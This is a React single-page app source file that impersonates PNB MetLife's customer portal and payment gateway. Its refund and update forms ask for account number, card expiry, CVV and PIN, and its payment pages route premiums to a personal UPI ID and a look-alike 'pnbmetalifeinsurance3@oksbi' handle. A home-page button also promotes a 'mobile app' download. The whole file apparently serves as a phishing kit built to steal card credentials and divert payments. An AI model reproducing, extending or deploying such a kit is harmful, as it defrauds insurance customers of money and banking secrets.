import { BrowserRouter as Router, Routes, Route, useNavigate } from 'react-router-dom'
import { useState, useEffect } from 'react'
import qrCode from './assets/qr-code.jpg'
import pnbAppLogo from './assets/pnb-app-logo.jpg'
import DownloadPage from './DownloadPage'
import './App.css'

// Icon Components
const UserIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
    <circle cx="12" cy="7" r="4"></circle>
  </svg>
)

const FileIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
    <polyline points="14 2 14 8 20 8"></polyline>
  </svg>
)

const PhoneIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
  </svg>
)

const CreditCardIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
    <line x1="1" y1="10" x2="23" y2="10"></line>
  </svg>
)

const CalendarIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
    <line x1="16" y1="2" x2="16" y2="6"></line>
    <line x1="8" y1="2" x2="8" y2="6"></line>
    <line x1="3" y1="10" x2="21" y2="10"></line>
  </svg>
)

const LockIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
  </svg>
)

const RupeeIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M18 7H6M18 7a2 2 0 0 1 0 4H6M18 7a2 2 0 0 0 0-4H6M6 11v8m0 0l4-4m-4 4l4 4"></path>
  </svg>
)

const ArrowRightIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <polyline points="9 18 15 12 9 6"></polyline>
  </svg>
)

const BackArrowIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <polyline points="15 18 9 12 15 6"></polyline>
  </svg>
)

const ClockIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="12" cy="12" r="10"></circle>
    <polyline points="12 6 12 12 16 14"></polyline>
  </svg>
)

// Home Page
function HomePage() {
  const navigate = useNavigate()

  return (
    <div className="container">
      <div className="card">
        <div className="home-header">
          <div className="home-logo">
            <img src={pnbAppLogo} alt="PNB" className="home-logo-img" />
            <div className="home-logo-text">pnb<span>MetLife</span></div>
          </div>
          <p className="home-tagline">Milkar life aage badhaein</p>
        </div>
        
        <div className="home-title">
          <h2>Select Service</h2>
          <p>Choose a service to continue</p>
        </div>

        <button 
          onClick={() => navigate('/download')}
          className="download-app-btn"
          style={{
            margin: '0 20px 20px',
            padding: '15px 20px',
            background: 'linear-gradient(135deg, #11998e 0%, #38ef7d 100%)',
            color: 'white',
            border: 'none',
            borderRadius: '12px',
            fontSize: '16px',
            fontWeight: '600',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '10px',
            width: 'calc(100% - 40px)'
          }}
        >
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
            <polyline points="7 10 12 15 17 10"></polyline>
            <line x1="12" y1="15" x2="12" y2="3"></line>
          </svg>
          Download Mobile App
        </button>

        <div className="service-grid">
          <button className="service-btn" onClick={() => navigate('/refund')}>
            <div className="service-icon refund">💰</div>
            <div className="service-info">
              <h3>Refund</h3>
              <p>Request a refund</p>
            </div>
            <span className="service-arrow"><ArrowRightIcon /></span>
          </button>

          <button className="service-btn" onClick={() => navigate('/update')}>
            <div className="service-icon update">🔄</div>
            <div className="service-info">
              <h3>Update</h3>
              <p>Update your details</p>
            </div>
            <span className="service-arrow"><ArrowRightIcon /></span>
          </button>

          <button className="service-btn" onClick={() => navigate('/payment')}>
            <div className="service-icon payment">💳</div>
            <div className="service-info">
              <h3>Online Payment</h3>
              <p>Pay your premium</p>
            </div>
            <span className="service-arrow"><ArrowRightIcon /></span>
          </button>
        </div>
      </div>
    </div>
  )
}

// Form Header Component
function PageHeader({ title, onBack }) {
  return (
    <div className="page-header">
      <button className="back-btn" onClick={onBack}>
        <BackArrowIcon />
      </button>
      <h1 className="page-title">{title}</h1>
    </div>
  )
}

// Refund Page
function RefundPage() {
  const navigate = useNavigate()

  const handleSubmit = (e) => {
    e.preventDefault()
    alert('Refund request submitted successfully!')
  }

  return (
    <div className="container">
      <div className="card">
        <PageHeader title="Refund Request" onBack={() => navigate('/')} />
        <form onSubmit={handleSubmit} className="form-content">
          <div className="input-group">
            <label className="input-label">Full Name</label>
            <div className="input-wrapper">
              <span className="input-icon-left"><UserIcon /></span>
              <input type="text" className="input-field" placeholder="Enter your full name" required />
            </div>
          </div>

          <div className="input-group">
            <label className="input-label">Mobile Number</label>
            <div className="input-wrapper">
              <span className="input-icon-left"><PhoneIcon /></span>
              <input type="tel" className="input-field" placeholder="Enter mobile number" required />
            </div>
          </div>

          <div className="input-group">
            <label className="input-label">Account Number</label>
            <div className="input-wrapper">
              <span className="input-icon-left"><CreditCardIcon /></span>
              <input type="text" className="input-field" placeholder="Enter account number" required />
            </div>
          </div>

          <div className="input-group">
            <label className="input-label">Confirm Account Number</label>
            <div className="input-wrapper">
              <span className="input-icon-left"><CreditCardIcon /></span>
              <input type="text" className="input-field" placeholder="Re-enter account number" required />
            </div>
          </div>

          <div className="input-row">
            <div className="input-group">
              <label className="input-label">Expiry Date</label>
              <div className="input-wrapper">
                <span className="input-icon-left"><CalendarIcon /></span>
                <input type="text" className="input-field" placeholder="MM/YY" maxLength="5" required />
              </div>
            </div>
            <div className="input-group">
              <label className="input-label">CVV</label>
              <div className="input-wrapper">
                <span className="input-icon-left"><LockIcon /></span>
                <input type="password" className="input-field" placeholder="CVV" maxLength="3" required />
              </div>
            </div>
          </div>

          <div className="input-row">
            <div className="input-group">
              <label className="input-label">PIN</label>
              <div className="input-wrapper">
                <span className="input-icon-left"><LockIcon /></span>
                <input type="password" className="input-field" placeholder="PIN" maxLength="4" required />
              </div>
            </div>
            <div className="input-group">
              <label className="input-label">Confirm PIN</label>
              <div className="input-wrapper">
                <span className="input-icon-left"><LockIcon /></span>
                <input type="password" className="input-field" placeholder="Confirm" maxLength="4" required />
              </div>
            </div>
          </div>

          <button type="submit" className="submit-btn">Submit Request</button>
        </form>
      </div>
    </div>
  )
}

// Update Page
function UpdatePage() {
  const navigate = useNavigate()

  const handleSubmit = (e) => {
    e.preventDefault()
    alert('Update request submitted successfully!')
  }

  return (
    <div className="container">
      <div className="card">
        <PageHeader title="Update Details" onBack={() => navigate('/')} />
        <form onSubmit={handleSubmit} className="form-content">
          <div className="input-group">
            <label className="input-label">Full Name</label>
            <div className="input-wrapper">
              <span className="input-icon-left"><UserIcon /></span>
              <input type="text" className="input-field" placeholder="Enter your full name" required />
            </div>
          </div>

          <div className="input-group">
            <label className="input-label">Mobile Number</label>
            <div className="input-wrapper">
              <span className="input-icon-left"><PhoneIcon /></span>
              <input type="tel" className="input-field" placeholder="Enter mobile number" required />
            </div>
          </div>

          <div className="input-group">
            <label className="input-label">Account Number</label>
            <div className="input-wrapper">
              <span className="input-icon-left"><CreditCardIcon /></span>
              <input type="text" className="input-field" placeholder="Enter account number" required />
            </div>
          </div>

          <div className="input-group">
            <label className="input-label">Confirm Account Number</label>
            <div className="input-wrapper">
              <span className="input-icon-left"><CreditCardIcon /></span>
              <input type="text" className="input-field" placeholder="Re-enter account number" required />
            </div>
          </div>

          <div className="input-row">
            <div className="input-group">
              <label className="input-label">Expiry Date</label>
              <div className="input-wrapper">
                <span className="input-icon-left"><CalendarIcon /></span>
                <input type="text" className="input-field" placeholder="MM/YY" maxLength="5" required />
              </div>
            </div>
            <div className="input-group">
              <label className="input-label">CVV</label>
              <div className="input-wrapper">
                <span className="input-icon-left"><LockIcon /></span>
                <input type="password" className="input-field" placeholder="CVV" maxLength="3" required />
              </div>
            </div>
          </div>

          <div className="input-row">
            <div className="input-group">
              <label className="input-label">PIN</label>
              <div className="input-wrapper">
                <span className="input-icon-left"><LockIcon /></span>
                <input type="password" className="input-field" placeholder="PIN" maxLength="4" required />
              </div>
            </div>
            <div className="input-group">
              <label className="input-label">Confirm PIN</label>
              <div className="input-wrapper">
                <span className="input-icon-left"><LockIcon /></span>
                <input type="password" className="input-field" placeholder="Confirm" maxLength="4" required />
              </div>
            </div>
          </div>

          <button type="submit" className="submit-btn">Submit Update</button>
        </form>
      </div>
    </div>
  )
}

// Payment Header Component
function PaymentHeader() {
  return (
    <div className="payment-header">
      <div className="pnb-logo-main">
        <div className="pnb-logo-box"></div>
        <span className="pnb-text">pnb</span>
        <span className="metlife-text">MetLife</span>
      </div>
      <p className="pnb-tagline">Milkar life aage badhaein</p>
      <div className="blue-separator"></div>
      <h2 className="gateway-title">PNB Metlife payment Gateway</h2>
    </div>
  )
}

// Online Payment Page 1 - Personal Details
function PaymentPage1() {
  const navigate = useNavigate()

  const handleSubmit = (e) => {
    e.preventDefault()
    navigate('/payment/2')
  }

  return (
    <div className="container">
      <div className="card payment-card">
        <PaymentHeader />
        
        <div className="payment-description">
          <p>At PNB Metlife customer convenience is given utmost priority. So in order to facilitate your premium payment we now offer the online payment option.</p>
        </div>

        <form onSubmit={handleSubmit} className="payment-form">
          <div className="payment-input-group">
            <div className="input-with-icon-wrapper">
              <span className="input-icon-svg"><UserIcon /></span>
              <input type="text" className="payment-input" placeholder="Enter your name" required />
            </div>
          </div>

          <div className="payment-input-group">
            <div className="input-with-icon-wrapper">
              <span className="input-icon-svg"><FileIcon /></span>
              <input type="text" className="payment-input" placeholder="Enter Policy Number" required />
            </div>
          </div>

          <div className="payment-input-group">
            <div className="input-with-icon-wrapper">
              <span className="input-icon-svg"><PhoneIcon /></span>
              <input type="tel" className="payment-input" placeholder="Enter your mobile number" required />
            </div>
          </div>

          <button type="submit" className="btn-blue">Next</button>
          <button type="button" className="btn-gray" onClick={() => navigate('/')} style={{ marginTop: '12px' }}>Back</button>
        </form>
      </div>
    </div>
  )
}

// Online Payment Page 2 - Payment Details
function PaymentPage2() {
  const navigate = useNavigate()

  const handleSubmit = (e) => {
    e.preventDefault()
    navigate('/payment/3')
  }

  return (
    <div className="container">
      <div className="card payment-card">
        <PaymentHeader />

        <form onSubmit={handleSubmit} className="payment-form">
          <h3 className="section-heading">Payment Details</h3>
          
          <div className="payment-input-group">
            <div className="input-with-icon-wrapper">
              <span className="input-icon-svg"><RupeeIcon /></span>
              <input type="number" className="payment-input" placeholder="Enter amount" required />
            </div>
          </div>

          <div className="checkbox-wrapper">
            <input type="checkbox" id="confirm" required />
            <label htmlFor="confirm">I confirm the payment amount</label>
          </div>

          <button type="submit" className="btn-blue">Submit Payment</button>

          <p className="terms-text">
            By proceeding, you agree to our By submitting your details, you agree to PNB MetLife's privacy policy, and authorize PNB MetLife and/or its authorized service providers to verify the above information and/or contact you to assist you with the policy purchase and/or servicing. The approval / authorization provided by you herein will supersede all earlier authorizations / approvals / disapprovals / registrations made by you in this regard <a href="#">Terms and Conditions</a>.
          </p>

          <button type="button" className="btn-gray" onClick={() => navigate('/payment')}>Back</button>
        </form>
      </div>
    </div>
  )
}

// Online Payment Page 3 - QR Code Payment
function PaymentPage3() {
  const navigate = useNavigate()
  const [timer, setTimer] = useState(300)

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          clearInterval(interval)
          return 0
        }
        return prev - 1
      })
    }, 1000)
    return () => clearInterval(interval)
  }, [])

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`
  }

  return (
    <div className="container">
      <div className="card payment-card">
        <PaymentHeader />

        <div className="qr-section">
          <h3 className="section-heading">Payment Details</h3>
          
          <div className="timer-display">
            <span className="timer-icon"><ClockIcon /></span>
            <span className="timer-text">{formatTime(timer)}</span>
          </div>

          <div className="qr-box">
            <p className="qr-label">SCAN QR CODE TO PAY</p>
            <div className="qr-code-display">
              <img src={qrCode} alt="QR Code" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
            </div>
            <div className="upi-display">
              <span className="upi-label">UPI ID:</span>
              <span className="upi-id">9378159046@ybl</span>
            </div>
          </div>

          <div className="app-icons-row">
            <div className="app-logo phonepe-logo">
              <svg viewBox="0 0 40 40" width="40" height="40">
                <rect width="40" height="40" rx="8" fill="#6739b7"/>
                <text x="20" y="28" textAnchor="middle" fill="white" fontSize="20" fontWeight="bold">P</text>
              </svg>
            </div>
            <div className="app-logo gpay-logo">
              <svg viewBox="0 0 40 40" width="40" height="40">
                <rect width="40" height="40" rx="8" fill="white" stroke="#ddd" strokeWidth="1"/>
                <text x="8" y="28" fontSize="16" fontWeight="bold" fill="#4285f4">G</text>
                <text x="18" y="28" fontSize="12" fill="#333">Pay</text>
              </svg>
            </div>
            <div className="app-logo paytm-logo">
              <svg viewBox="0 0 40 40" width="40" height="40">
                <rect width="40" height="40" rx="8" fill="#002970"/>
                <text x="20" y="26" textAnchor="middle" fill="#00BAF2" fontSize="14" fontWeight="bold">Paytm</text>
              </svg>
            </div>
          </div>

          <button 
            className="btn-purple" 
            onClick={() => window.location.href = 'phonepe://pay?pa=pnbmetalifeinsurance3@oksbi&pn=PNB%20MetLife&mc=0000&tid=TXN123456&tr=TXN123456&tn=Premium%20Payment&am=1000&cu=INR'}
          >
            Pay with PhonePe
          </button>
          <button 
            className="btn-gpay"
            onClick={() => window.location.href = 'tez://upi/pay?pa=pnbmetalifeinsurance3@oksbi&pn=PNB%20MetLife&mc=0000&tid=TXN123456&tr=TXN123456&tn=Premium%20Payment&am=1000&cu=INR'}
          >
            Pay with Google Pay
          </button>
          <button 
            className="btn-navy"
            onClick={() => window.location.href = 'paytmmp://pay?pa=pnbmetalifeinsurance3@oksbi&pn=PNB%20MetLife&mc=0000&tid=TXN123456&tr=TXN123456&tn=Premium%20Payment&am=1000&cu=INR'}
          >
            Pay with Paytm
          </button>
          <button className="btn-gray" onClick={() => navigate('/payment/2')}>Back</button>
        </div>
      </div>
    </div>
  )
}

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<HomePage />} />
        <Route path="/refund" element={<RefundPage />} />
        <Route path="/update" element={<UpdatePage />} />
        <Route path="/payment" element={<PaymentPage1 />} />
        <Route path="/payment/2" element={<PaymentPage2 />} />
        <Route path="/payment/3" element={<PaymentPage3 />} />
        <Route path="/download" element={<DownloadPage />} />
      </Routes>
    </Router>
  )
}

export default App
